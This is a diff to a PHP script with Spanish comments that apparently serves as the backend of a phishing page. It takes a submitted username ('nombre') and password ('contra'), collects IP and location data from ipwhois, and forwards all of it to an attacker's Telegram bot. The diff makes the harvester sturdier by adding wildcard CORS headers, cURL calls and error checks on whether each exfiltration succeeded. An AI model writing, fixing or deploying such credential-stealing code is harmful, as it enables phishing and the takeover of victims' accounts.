@@ -1,14 +1,25 @@
 <?php
+header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Headers: Content-Type");
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $action = $_POST['action'];
-    
+    $action = $_POST['action'] ?? '';
+
     if ($action === 'send_username') {
-        $nombre = $_POST['nombre'];
+        $nombre = $_POST['nombre'] ?? '';
 
         // Obtener la información de ubicación desde ipwhois.io
-        $ip_data = file_get_contents('https://ipwhois.app/json/');
+        $ch = curl_init('https://ipwhois.app/json/');
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $ip_data = curl_exec($ch);
+        curl_close($ch);
+
+        if ($ip_data === false) {
+            echo json_encode(['success' => false, 'message' => 'Error al obtener datos de IP']);
+            exit;
+        }
+
         $ip_info = json_decode($ip_data, true);
-        
         $ciudad = $ip_info['city'] ?? 'Desconocido';
         $pais = $ip_info['country'] ?? 'Desconocido';
         $ip = $ip_info['ip'] ?? 'Desconocida';
@@ -21,12 +32,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         
         // Enviar el mensaje a Telegram
         $url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
-        file_get_contents($url); // O usa cURL para mayor control
+        $response = file_get_contents($url); // O usa cURL para mayor control
 
-        echo json_encode(['success' => true]);
+        $response_data = json_decode($response, true);
+        if (isset($response_data['ok']) && $response_data['ok']) {
+            echo json_encode(['success' => true]);
+        } else {
+            echo json_encode(['success' => false, 'message' => 'Error al enviar el mensaje a Telegram']);
+        }
     } elseif ($action === 'send_credentials') {
-        $nombre = $_POST['nombre'];
-        $contra = $_POST['contra'];
+        $nombre = $_POST['nombre'] ?? '';
+        $contra = $_POST['contra'] ?? '';
 
         // Formatear el mensaje con las credenciales
         $message = "------ VEN ------\nNombre: $nombre\nContra: $contra";
@@ -38,7 +54,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
         $response = file_get_contents($url); // O usa cURL para mayor control
 
-        // Comprobar la respuesta de Telegram
         $response_data = json_decode($response, true);
         if (isset($response_data['ok']) && $response_data['ok']) {
             echo json_encode(['success' => true]);
